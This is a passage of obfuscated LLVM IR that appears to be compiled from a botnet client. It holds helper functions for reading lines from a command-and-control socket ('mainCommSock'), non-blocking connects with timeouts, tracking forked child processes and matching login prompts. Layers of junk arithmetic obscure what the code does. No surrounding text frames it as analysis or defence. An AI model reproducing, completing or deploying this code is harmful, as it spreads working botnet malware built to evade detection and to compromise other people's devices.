; <label>:13:                                     ; preds = %2
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds i8, i8* %14, i64 1
  %16 = load i8*, i8** %5, align 8
  %17 = call i32 @wildString(i8* %15, i8* %16)
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %43

; <label>:19:                                     ; preds = %13
  %20 = load i8*, i8** %5, align 8
  %21 = load i8, i8* %20, align 1
  %22 = zext i8 %21 to i32
  %23 = icmp ne i32 %22, 0
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %19
  %25 = load i8*, i8** %4, align 8
  %26 = load i8*, i8** %5, align 8
  %27 = getelementptr inbounds i8, i8* %26, i64 1
  %28 = call i32 @wildString(i8* %25, i8* %27)
  %29 = icmp ne i32 %28, 0
  %30 = xor i1 %29, true
  %31 = and i1 false, %30
  %32 = xor i1 false, true
  %33 = and i1 %29, %32
  %34 = xor i1 true, true
  %35 = and i1 %34, false
  %36 = and i1 true, %32
  %37 = or i1 %31, %33
  %38 = or i1 %35, %36
  %39 = xor i1 %37, %38
  %40 = xor i1 %29, true
  br label %41

; <label>:41:                                     ; preds = %24, %19
  %42 = phi i1 [ false, %19 ], [ %39, %24 ]
  br label %43

; <label>:43:                                     ; preds = %41, %13
  %44 = phi i1 [ true, %13 ], [ %42, %41 ]
  %45 = xor i1 %44, true
  %46 = and i1 true, %45
  %47 = xor i1 true, true
  %48 = and i1 %44, %47
  %49 = or i1 %46, %48
  %50 = xor i1 %44, true
  %51 = zext i1 %49 to i32
  store i32 %51, i32* %3, align 4
  br label %121

; <label>:52:                                     ; preds = %2
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %57, label %75

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %4, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 1
  %60 = load i8*, i8** %5, align 8
  %61 = getelementptr inbounds i8, i8* %60, i64 1
  %62 = call i32 @wildString(i8* %59, i8* %61)
  %63 = icmp ne i32 %62, 0
  %64 = xor i1 %63, true
  %65 = and i1 false, %64
  %66 = xor i1 false, true
  %67 = and i1 %63, %66
  %68 = xor i1 true, true
  %69 = and i1 %68, false
  %70 = and i1 true, %66
  %71 = or i1 %65, %67
  %72 = or i1 %69, %70
  %73 = xor i1 %71, %72
  %74 = xor i1 %63, true
  br label %75

; <label>:75:                                     ; preds = %57, %52
  %76 = phi i1 [ false, %52 ], [ %73, %57 ]
  %77 = xor i1 %76, true
  %78 = and i1 true, %77
  %79 = xor i1 true, true
  %80 = and i1 %76, %79
  %81 = or i1 %78, %80
  %82 = xor i1 %76, true
  %83 = zext i1 %81 to i32
  store i32 %83, i32* %3, align 4
  br label %121

; <label>:84:                                     ; preds = %2
  %85 = load i8*, i8** %4, align 8
  %86 = load i8, i8* %85, align 1
  %87 = zext i8 %86 to i32
  %88 = call i32 @toupper(i32 %87) #9
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = call i32 @toupper(i32 %91) #9
  %93 = icmp eq i32 %88, %92
  br i1 %93, label %94, label %112

; <label>:94:                                     ; preds = %84
  %95 = load i8*, i8** %4, align 8
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = load i8*, i8** %5, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 1
  %99 = call i32 @wildString(i8* %96, i8* %98)
  %100 = icmp ne i32 %99, 0
  %101 = xor i1 %100, true
  %102 = and i1 true, %101
  %103 = xor i1 true, true
  %104 = and i1 %100, %103
  %105 = xor i1 true, true
  %106 = and i1 %105, true
  %107 = and i1 true, %103
  %108 = or i1 %102, %104
  %109 = or i1 %106, %107
  %110 = xor i1 %108, %109
  %111 = xor i1 %100, true
  br label %112

; <label>:112:                                    ; preds = %94, %84
  %113 = phi i1 [ false, %84 ], [ %110, %94 ]
  %114 = xor i1 %113, true
  %115 = and i1 true, %114
  %116 = xor i1 true, true
  %117 = and i1 %113, %116
  %118 = or i1 %115, %117
  %119 = xor i1 %113, true
  %120 = zext i1 %118 to i32
  store i32 %120, i32* %3, align 4
  br label %121

; <label>:121:                                    ; preds = %112, %75, %43, %9
  %122 = load i32, i32* %3, align 4
  ret i32 %122
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #5
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %23, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %30

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 0, %12
  %14 = sub i32 0, 65
  %15 = add i32 %13, %14
  %16 = sub i32 0, %15
  %17 = add i32 %12, 65
  %18 = trunc i32 %16 to i8
  %19 = load i8*, i8** %3, align 8
  %20 = load i32, i32* %5, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 %18, i8* %22, align 1
  br label %23

; <label>:23:                                     ; preds = %10
  %24 = load i32, i32* %5, align 4
  %25 = sub i32 0, %24
  %26 = sub i32 0, 1
  %27 = add i32 %25, %26
  %28 = sub i32 0, %27
  %29 = add nsw i32 %24, 1
  store i32 %28, i32* %5, align 4
  br label %6

; <label>:30:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #5, !srcloc !2
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, 1
  %50 = sub i32 %48, %49
  %51 = add nsw i32 %48, 1
  %52 = call i32 @select(i32 %50, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %52, i32* %12, align 4
  %53 = icmp sle i32 %52, 0
  br i1 %53, label %54, label %101

; <label>:54:                                     ; preds = %33
  br label %55

; <label>:55:                                     ; preds = %92, %54
  %56 = load i32, i32* %13, align 4
  %57 = icmp slt i32 %56, 10
  br i1 %57, label %58, label %100

; <label>:58:                                     ; preds = %55
  %59 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %59, align 8
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %60, align 8
  br label %61

; <label>:61:                                     ; preds = %58
  %62 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %63 = getelementptr inbounds [16 x i64], [16 x i64]* %62, i64 0, i64 0
  %64 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %63) #5, !srcloc !3
  %65 = extractvalue { i64, i64* } %64, 0
  %66 = extractvalue { i64, i64* } %64, 1
  %67 = trunc i64 %65 to i32
  store i32 %67, i32* %14, align 4
  %68 = ptrtoint i64* %66 to i64
  %69 = trunc i64 %68 to i32
  store i32 %69, i32* %15, align 4
  br label %70

; <label>:70:                                     ; preds = %61
  %71 = load i32, i32* %5, align 4
  %72 = srem i32 %71, 64
  %73 = zext i32 %72 to i64
  %74 = shl i64 1, %73
  %75 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %76 = load i32, i32* %5, align 4
  %77 = sdiv i32 %76, 64
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [16 x i64], [16 x i64]* %75, i64 0, i64 %78
  %80 = load i64, i64* %79, align 8
  %81 = and i64 %80, %74
  %82 = xor i64 %80, %74
  %83 = or i64 %81, %82
  %84 = or i64 %80, %74
  store i64 %83, i64* %79, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sub i32 %85, -2134804893
  %87 = add i32 %86, 1
  %88 = add i32 %87, -2134804893
  %89 = add nsw i32 %85, 1
  %90 = call i32 @select(i32 %88, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %90, i32* %12, align 4
  %91 = icmp sle i32 %90, 0
  br i1 %91, label %92, label %99

; <label>:92:                                     ; preds = %70
  %93 = load i32, i32* %13, align 4
  %94 = sub i32 0, %93
  %95 = sub i32 0, 1
  %96 = add i32 %94, %95
  %97 = sub i32 0, %96
  %98 = add nsw i32 %93, 1
  store i32 %97, i32* %13, align 4
  br label %55

; <label>:99:                                     ; preds = %70
  br label %100

; <label>:100:                                    ; preds = %99, %55
  br label %101

; <label>:101:                                    ; preds = %100, %33
  store i32 0, i32* %18, align 4
  %102 = load i8*, i8** %6, align 8
  store i8* %102, i8** %17, align 8
  br label %103

; <label>:103:                                    ; preds = %125, %101
  %104 = load i32, i32* %7, align 4
  %105 = sub i32 0, %104
  %106 = sub i32 0, -1
  %107 = add i32 %105, %106
  %108 = sub i32 0, %107
  %109 = add nsw i32 %104, -1
  store i32 %108, i32* %7, align 4
  %110 = icmp sgt i32 %104, 1
  br i1 %110, label %111, label %130

; <label>:111:                                    ; preds = %103
  %112 = load i32, i32* @mainCommSock, align 4
  %113 = call i64 @recv(i32 %112, i8* %16, i64 1, i32 0)
  %114 = icmp ne i64 %113, 1
  br i1 %114, label %115, label %117

; <label>:115:                                    ; preds = %111
  %116 = load i8*, i8** %17, align 8
  store i8 0, i8* %116, align 1
  store i32 -1, i32* %4, align 4
  br label %133

; <label>:117:                                    ; preds = %111
  %118 = load i8, i8* %16, align 1
  %119 = load i8*, i8** %17, align 8
  %120 = getelementptr inbounds i8, i8* %119, i32 1
  store i8* %120, i8** %17, align 8
  store i8 %118, i8* %119, align 1
  %121 = load i8, i8* %16, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 10
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %117
  br label %130

; <label>:125:                                    ; preds = %117
  %126 = load i32, i32* %18, align 4
  %127 = sub i32 0, 1
  %128 = sub i32 %126, %127
  %129 = add nsw i32 %126, 1
  store i32 %128, i32* %18, align 4
  br label %103

; <label>:130:                                    ; preds = %124, %103
  %131 = load i8*, i8** %17, align 8
  store i8 0, i8* %131, align 1
  %132 = load i32, i32* %18, align 4
  store i32 %132, i32* %4, align 4
  br label %133

; <label>:133:                                    ; preds = %130, %115
  %134 = load i32, i32* %4, align 4
  ret i32 %134
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = and i64 %22, 2048
  %24 = xor i64 %22, 2048
  %25 = or i64 %23, %24
  %26 = or i64 %22, 2048
  store i64 %25, i64* %15, align 8
  %27 = load i32, i32* %6, align 4
  %28 = load i64, i64* %15, align 8
  %29 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i64 %28)
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %30, align 4
  %31 = load i32, i32* %8, align 4
  %32 = trunc i32 %31 to i16
  %33 = call zeroext i16 @htons(i16 zeroext %32) #10
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  %35 = load i8*, i8** %7, align 8
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %37 = call i32 @getHost(i8* %35, %struct.in_addr* %36)
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %127

; <label>:40:                                     ; preds = %4
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %42 = getelementptr inbounds [8 x i8], [8 x i8]* %41, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 8, i32 4, i1 false)
  %43 = load i32, i32* %6, align 4
  %44 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %45 = call i32 @connect(i32 %43, %struct.sockaddr* %44, i32 16)
  store i32 %45, i32* %16, align 4
  %46 = load i32, i32* %16, align 4
  %47 = icmp slt i32 %46, 0
  br i1 %47, label %48, label %111

; <label>:48:                                     ; preds = %40
  %49 = call i32* @__errno_location() #10
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 115
  br i1 %51, label %52, label %109

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* %9, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %54, i64* %55, align 8
  %56 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %56, align 8
  br label %57

; <label>:57:                                     ; preds = %52
  %58 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %59 = getelementptr inbounds [16 x i64], [16 x i64]* %58, i64 0, i64 0
  %60 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %59) #5, !srcloc !4
  %61 = extractvalue { i64, i64* } %60, 0
  %62 = extractvalue { i64, i64* } %60, 1
  %63 = trunc i64 %61 to i32
  store i32 %63, i32* %17, align 4
  %64 = ptrtoint i64* %62 to i64
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %18, align 4
  br label %66

; <label>:66:                                     ; preds = %57
  %67 = load i32, i32* %6, align 4
  %68 = srem i32 %67, 64
  %69 = zext i32 %68 to i64
  %70 = shl i64 1, %69
  %71 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %72 = load i32, i32* %6, align 4
  %73 = sdiv i32 %72, 64
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = xor i64 %76, -1
  %78 = xor i64 %70, -1
  %79 = xor i64 -459772406302220527, -1
  %80 = and i64 %77, -459772406302220527
  %81 = and i64 %76, %79
  %82 = and i64 %78, -459772406302220527
  %83 = and i64 %70, %79
  %84 = or i64 %80, %81
  %85 = or i64 %82, %83
  %86 = xor i64 %84, %85
  %87 = or i64 %77, %78
  %88 = xor i64 %87, -1
  %89 = or i64 -459772406302220527, %79
  %90 = and i64 %88, %89
  %91 = or i64 %86, %90
  %92 = or i64 %76, %70
  store i64 %91, i64* %75, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, 1
  %95 = sub i32 %93, %94
  %96 = add nsw i32 %93, 1
  %97 = call i32 @select(i32 %95, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %98 = icmp sgt i32 %97, 0
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %66
  store i32 4, i32* %13, align 4
  %100 = load i32, i32* %6, align 4
  %101 = bitcast i32* %14 to i8*
  %102 = call i32 @getsockopt(i32 %100, i32 1, i32 4, i8* %101, i32* %13) #5
  %103 = load i32, i32* %14, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %99
  store i32 0, i32* %5, align 4
  br label %127

; <label>:106:                                    ; preds = %99
  br label %108

; <label>:107:                                    ; preds = %66
  store i32 0, i32* %5, align 4
  br label %127

; <label>:108:                                    ; preds = %106
  br label %110

; <label>:109:                                    ; preds = %48
  store i32 0, i32* %5, align 4
  br label %127

; <label>:110:                                    ; preds = %108
  br label %111

; <label>:111:                                    ; preds = %110, %40
  %112 = load i32, i32* %6, align 4
  %113 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null)
  %114 = sext i32 %113 to i64
  store i64 %114, i64* %15, align 8
  %115 = load i64, i64* %15, align 8
  %116 = xor i64 %115, -1
  %117 = xor i64 -2049, -1
  %118 = xor i64 8125182038388221040, -1
  %119 = or i64 %116, %117
  %120 = or i64 8125182038388221040, %118
  %121 = xor i64 %119, -1
  %122 = and i64 %121, %120
  %123 = and i64 %115, -2049
  store i64 %122, i64* %15, align 8
  %124 = load i32, i32* %6, align 4
  %125 = load i64, i64* %15, align 8
  %126 = call i32 (i32, i32, ...) @fcntl(i32 %124, i32 4, i64 %125)
  store i32 1, i32* %5, align 4
  br label %127

; <label>:127:                                    ; preds = %111, %109, %107, %105, %39
  %128 = load i32, i32* %5, align 4
  ret i32 %128
}

declare i32 @fcntl(i32, i32, ...) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #6

declare i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #5
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %62

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1907661772301296041
  %13 = add i64 %12, 1
  %14 = sub i64 %13, 1907661772301296041
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = sub i64 0, %16
  %18 = sub i64 0, 1
  %19 = add i64 %17, %18
  %20 = sub i64 0, %19
  %21 = add i64 %16, 1
  %22 = mul i64 %20, 4
  %23 = call noalias i8* @malloc(i64 %22) #5
  %24 = bitcast i8* %23 to i32*
  store i32* %24, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %25

; <label>:25:                                     ; preds = %44, %10
  %26 = load i32, i32* %4, align 4
  %27 = zext i32 %26 to i64
  %28 = load i64, i64* @numpids, align 8
  %29 = add i64 %28, -2852647050064166521
  %30 = sub i64 %29, 1
  %31 = sub i64 %30, -2852647050064166521
  %32 = sub i64 %28, 1
  %33 = icmp ult i64 %27, %31
  br i1 %33, label %34, label %50

; <label>:34:                                     ; preds = %25
  %35 = load i32*, i32** @pids, align 8
  %36 = load i32, i32* %4, align 4
  %37 = zext i32 %36 to i64
  %38 = getelementptr inbounds i32, i32* %35, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = load i32*, i32** %3, align 8
  %41 = load i32, i32* %4, align 4
  %42 = zext i32 %41 to i64
  %43 = getelementptr inbounds i32, i32* %40, i64 %42
  store i32 %39, i32* %43, align 4
  br label %44

; <label>:44:                                     ; preds = %34
  %45 = load i32, i32* %4, align 4
  %46 = sub i32 %45, 489365443
  %47 = add i32 %46, 1
  %48 = add i32 %47, 489365443
  %49 = add i32 %45, 1
  store i32 %48, i32* %4, align 4
  br label %25

; <label>:50:                                     ; preds = %25
  %51 = load i32, i32* %2, align 4
  %52 = load i32*, i32** %3, align 8
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 0, 1
  %55 = add i64 %53, %54
  %56 = sub i64 %53, 1
  %57 = getelementptr inbounds i32, i32* %52, i64 %55
  store i32 %51, i32* %57, align 4
  %58 = load i32*, i32** @pids, align 8
  %59 = bitcast i32* %58 to i8*
  call void @free(i8* %59) #5
  %60 = load i32*, i32** %3, align 8
  store i32* %60, i32** @pids, align 8
  %61 = load i32, i32* %2, align 4
  store i32 %61, i32* %1, align 4
  br label %62

; <label>:62:                                     ; preds = %50, %8
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #9
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %114, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #9
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %119

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %86, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %84

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = add i64 0, -3286455119387756352
  %30 = sub i64 %29, %28
  %31 = sub i64 %30, -3286455119387756352
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %82, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = add i64 0, 5168951793140068093
  %45 = sub i64 %44, %43
  %46 = sub i64 %45, 5168951793140068093
  %47 = sub i64 0, %43
  %48 = getelementptr inbounds i8, i8* %41, i64 %46
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %82, label %52

; <label>:52:                                     ; preds = %37
  %53 = load i8*, i8** %3, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = sub i64 0, 8700480551244026880
  %60 = sub i64 %59, %58
  %61 = add i64 %60, 8700480551244026880
  %62 = sub i64 0, %58
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %65, 13
  br i1 %66, label %82, label %67

; <label>:67:                                     ; preds = %52
  %68 = load i8*, i8** %3, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = add i64 0, -2664432419877888971
  %75 = sub i64 %74, %73
  %76 = sub i64 %75, -2664432419877888971
  %77 = sub i64 0, %73
  %78 = getelementptr inbounds i8, i8* %71, i64 %76
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 10
  br label %82

; <label>:82:                                     ; preds = %67, %52, %37, %22
  %83 = phi i1 [ true, %52 ], [ true, %37 ], [ true, %22 ], [ %81, %67 ]
  br label %84

; <label>:84:                                     ; preds = %82, %18
  %85 = phi i1 [ false, %18 ], [ %83, %82 ]
  br i1 %85, label %86, label %92

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* %7, align 4
  %88 = add i32 %87, -1233150672
  %89 = add i32 %88, 1
  %90 = sub i32 %89, -1233150672
  %91 = add nsw i32 %87, 1
  store i32 %90, i32* %7, align 4
  br label %18

; <label>:92:                                     ; preds = %84
  %93 = load i8*, i8** %3, align 8
  %94 = load i32, i32* %5, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i8, i8* %93, i64 %95
  %97 = load i32, i32* %7, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 0, %98
  %100 = add i64 0, %99
  %101 = sub i64 0, %98
  %102 = getelementptr inbounds i8, i8* %96, i64 %100
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = load i8*, i8** %4, align 8
  %106 = load i32, i32* %6, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds i8, i8* %105, i64 %107
  %109 = load i8, i8* %108, align 1
  %110 = sext i8 %109 to i32
  %111 = icmp eq i32 %104, %110
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %92
  store i32 1, i32* %2, align 4
  br label %120

; <label>:113:                                    ; preds = %92
  br label %114

; <label>:114:                                    ; preds = %113
  %115 = load i32, i32* %6, align 4
  %116 = sub i32 0, 1
  %117 = sub i32 %115, %116
  %118 = add nsw i32 %115, 1
  store i32 %117, i32* %6, align 4
  br label %11

; <label>:119:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %120

; <label>:120:                                    ; preds = %119, %112
  %121 = load i32, i32* %2, align 4
  ret i32 %121
